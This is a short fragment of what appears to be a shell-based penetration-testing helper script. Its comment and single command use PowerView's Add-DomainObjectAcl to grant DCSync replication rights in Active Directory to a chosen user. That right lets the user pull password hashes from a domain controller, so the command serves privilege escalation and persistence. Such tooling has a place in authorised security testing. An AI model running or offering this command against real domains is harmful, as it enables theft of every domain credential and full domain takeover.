...
: '
powerview: set dc sync rights of a group to a specific ad user
'
...
execute_command "Add-DomainObjectAcl -Rights 'DCSync' -TargetDomain "${DOMAIN}" -PrincipalIdentity ${AD_USERNAME} -Credential \$credential -Verbose"
create_new_line
